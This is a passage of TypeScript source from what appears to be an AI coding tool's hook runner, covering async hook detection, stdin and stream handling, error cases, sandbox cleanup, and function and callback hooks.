    // Check for async response on first line of output. The async protocol is:
    // hook emits {"async":true,...} as its FIRST line, then its normal output.
    // We must parse ONLY the first line — if the process is fast and writes more
    // before this 'data' event fires, parsing the full accumulated stdout fails
    // and an async hook blocks for its full duration instead of backgrounding.
    if (!initialResponseChecked) {
      const firstLine = firstLineOf(stdout).trim()
      if (!firstLine.includes('}')) return
      initialResponseChecked = true
      logForDebugging(`Hooks: Checking first line for async: ${firstLine}`)
      try {
        const parsed = jsonParse(firstLine)
        logForDebugging(
          `Hooks: Parsed initial response: ${jsonStringify(parsed)}`,
        )
        if (isAsyncHookJSONOutput(parsed) && !forceSyncExecution) {
          const processId = `async_hook_${child.pid}`
          logForDebugging(
            `Hooks: Detected async hook, backgrounding process ${processId}`,
          )

          const backgrounded = executeInBackground({
            processId,
            hookId,
            shellCommand,
            asyncResponse: parsed,
            hookEvent,
            hookName,
            command: hook.command,
            pluginId,
          })
          if (backgrounded) {
            shellCommandTransferred = true
            asyncResolve?.({
              stdout,
              stderr,
              output,
              status: 0,
            })
          }
        } else if (isAsyncHookJSONOutput(parsed) && forceSyncExecution) {
          logForDebugging(
            `Hooks: Detected async hook but forceSyncExecution is true, waiting for completion`,
          )
        } else {
          logForDebugging(
            `Hooks: Initial response is not async, continuing normal processing`,
          )
        }
      } catch (e) {
        logForDebugging(`Hooks: Failed to parse initial response as JSON: ${e}`)
      }
    }
  })

  child.stderr.on('data', data => {
    stderr += data
    output += data
  })

  const stopProgressInterval = startHookProgressInterval({
    hookId,
    hookName,
    hookEvent,
    getOutput: async () => ({ stdout, stderr, output }),
  })

  // Wait for stdout and stderr streams to finish before considering output complete
  // This prevents a race condition where 'close' fires before all 'data' events are processed
  const stdoutEndPromise = new Promise<void>(resolve => {
    child.stdout.on('end', () => resolve())
  })

  const stderrEndPromise = new Promise<void>(resolve => {
    child.stderr.on('end', () => resolve())
  })

  // Write to stdin, making sure to handle EPIPE errors that can happen when
  // the hook command exits before reading all input.
  // Note: EPIPE handling is difficult to set up in testing since Bun and Node
  // have different behaviors.
  // TODO: Add tests for EPIPE handling.
  // Skip if stdin was already written (e.g., by config-based async hook path)
  const stdinWritePromise = stdinWritten
    ? Promise.resolve()
    : new Promise<void>((resolve, reject) => {
        child.stdin.on('error', err => {
          // When requestPrompt is provided, stdin stays open for prompt responses.
          // EPIPE errors from later writes (after process exits) are expected -- suppress them.
          if (!requestPrompt) {
            reject(err)
          } else {
            logForDebugging(
              `Hooks: stdin error during prompt flow (likely process exited): ${err}`,
            )
          }
        })
        // Explicitly specify UTF-8 encoding to ensure proper handling of Unicode characters
        child.stdin.write(jsonInput + '\n', 'utf8')
        // When requestPrompt is provided, keep stdin open for prompt responses
        if (!requestPrompt) {
          child.stdin.end()
        }
        resolve()
      })

  // Create promise for child process error
  const childErrorPromise = new Promise<never>((_, reject) => {
    child.on('error', reject)
  })

  // Create promise for child process close - but only resolve after streams end
  // to ensure all output has been collected
  const childClosePromise = new Promise<{
    stdout: string
    stderr: string
    output: string
    status: number
    aborted?: boolean
  }>(resolve => {
    let exitCode: number | null = null

    child.on('close', code => {
      exitCode = code ?? 1

      // Wait for both streams to end before resolving with the final output
      void Promise.all([stdoutEndPromise, stderrEndPromise]).then(() => {
        // Strip lines we processed as prompt requests so parseHookOutput
        // only sees the final hook result. Content-matching against the set
        // of actually-processed lines means prompt JSON can never leak
        // through (fail-closed), regardless of line positioning.
        const finalStdout =
          processedPromptLines.size === 0
            ? stdout
            : stdout
                .split('\n')
                .filter(line => !processedPromptLines.has(line.trim()))
                .join('\n')

        resolve({
          stdout: finalStdout,
          stderr,
          output,
          status: exitCode!,
          aborted: signal.aborted,
        })
      })
    })
  })

  // Race between stdin write, async detection, and process completion
  try {
    if (shouldEmitDiag) {
      logForDiagnosticsNoPII('info', 'hook_spawn_started', {
        hook_event_name: hookEvent,
        index: hookIndex,
      })
    }
    await Promise.race([stdinWritePromise, childErrorPromise])

    // Wait for any pending prompt responses before resolving
    const result = await Promise.race([
      childIsAsyncPromise,
      childClosePromise,
      childErrorPromise,
    ])
    // Ensure all queued prompt responses have been sent
    await promptChain
    diagExitCode = result.status
    diagAborted = result.aborted ?? false
    return result
  } catch (error) {
    // Handle errors from stdin write or child process
    const code = getErrnoCode(error)
    diagExitCode = 1

    if (code === 'EPIPE') {
      logForDebugging(
        'EPIPE error while writing to hook stdin (hook command likely closed early)',
      )
      const errMsg =
        'Hook command closed stdin before hook input was fully written (EPIPE)'
      return {
        stdout: '',
        stderr: errMsg,
        output: errMsg,
        status: 1,
      }
    } else if (code === 'ABORT_ERR') {
      diagAborted = true
      return {
        stdout: '',
        stderr: 'Hook cancelled',
        output: 'Hook cancelled',
        status: 1,
        aborted: true,
      }
    } else {
      const errorMsg = errorMessage(error)
      const errOutput = `Error occurred while executing hook command: ${errorMsg}`
      return {
        stdout: '',
        stderr: errOutput,
        output: errOutput,
        status: 1,
      }
    }
  } finally {
    if (shouldEmitDiag) {
      logForDiagnosticsNoPII('info', 'hook_spawn_completed', {
        hook_event_name: hookEvent,
        index: hookIndex,
        duration_ms: Date.now() - diagStartMs,
        exit_code: diagExitCode,
        aborted: diagAborted,
      })
    }
    stopProgressInterval()
    // Clean up stream resources unless ownership was transferred (e.g., to async hook registry)
    if (!shellCommandTransferred) {
      shellCommand.cleanup()
    }
    // Clean up sandbox artifacts (e.g. bwrap mount-point files on Linux)
    if (sandboxedCommand !== finalCommand) {
      SandboxManager.cleanupAfterCommand()
    }
  }
}

export async function executeFunctionHook({
  hook,
  messages,
  hookName,
  toolUseID,
  hookEvent,
  timeoutMs,
  signal,
}: {
  hook: FunctionHook
  messages: Message[]
  hookName: string
  toolUseID: string
  hookEvent: HookEvent
  timeoutMs: number
  signal?: AbortSignal
}): Promise<HookResult> {
  const callbackTimeoutMs = hook.timeout ?? timeoutMs
  const { signal: abortSignal, cleanup } = createCombinedAbortSignal(signal, {
    timeoutMs: callbackTimeoutMs,
  })

  try {
    // Check if already aborted
    if (abortSignal.aborted) {
      cleanup()
      return {
        outcome: 'cancelled',
        hook,
      }
    }

    // Execute callback with abort signal
    const passed = await new Promise<boolean>((resolve, reject) => {
      // Handle abort signal
      const onAbort = () => reject(new Error('Function hook cancelled'))
      abortSignal.addEventListener('abort', onAbort)

      // Execute callback
      Promise.resolve(hook.callback(messages, abortSignal))
        .then(result => {
          abortSignal.removeEventListener('abort', onAbort)
          resolve(result)
        })
        .catch(error => {
          abortSignal.removeEventListener('abort', onAbort)
          reject(error)
        })
    })

    cleanup()

    if (passed) {
      return {
        outcome: 'success',
        hook,
      }
    }
    return {
      blockingError: {
        blockingError: hook.errorMessage,
        command: 'function',
      },
      outcome: 'blocking',
      hook,
    }
  } catch (error) {
    cleanup()

    // Handle cancellation
    if (
      error instanceof Error &&
      (error.message === 'Function hook cancelled' ||
        error.name === 'AbortError')
    ) {
      return {
        outcome: 'cancelled',
        hook,
      }
    }

    // Log for monitoring
    logError(error)
    return {
      message: createAttachmentMessage({
        type: 'hook_error_during_execution',
        hookName,
        toolUseID,
        hookEvent,
        content:
          error instanceof Error
            ? error.message
            : 'Function hook execution error',
      }),
      outcome: 'non_blocking_error',
      hook,
    }
  }
}

export async function executeHookCallback({
  toolUseID,
  hook,
  hookEvent,
  hookInput,
  signal,
  hookIndex,
  toolUseContext,
}: {
  toolUseID: string
  hook: HookCallback
  hookEvent: HookEvent
  hookInput: HookInput
  signal: AbortSignal
  hookIndex?: number
  toolUseContext?: ToolUseContext
}): Promise<HookResult> {
  // Create context for callbacks that need state access
  const context = toolUseContext
    ? {
        getAppState: toolUseContext.getAppState,
        updateAttributionState: toolUseContext.updateAttributionState,
      }
    : undefined
  const json = await hook.callback(
    hookInput,
    toolUseID,
    signal,
    hookIndex,
    context,
  )
  if (isAsyncHookJSONOutput(json)) {
    return {
      outcome: 'success',
      hook,
    }
  }

  const processed = processHookJSONOutput({
    json,
    command: 'callback',
    // TODO: If the hook came from a plugin, use the full path to the plugin for easier debugging
    hookName: `${hookEvent}:Callback`,
    toolUseID,
    hookEvent,
    expectedHookEvent: hookEvent,
    // Callbacks don't have stdout/stderr/exitCode
    stdout: undefined,
    stderr: undefined,
    exitCode: undefined,
  })
  return {
    ...processed,
    outcome: 'success',
    hook,
  }
}

export { isAsyncHookJSONOutput, isSyncHookJSONOutput }
export type { PromptRequest, PromptResponse }
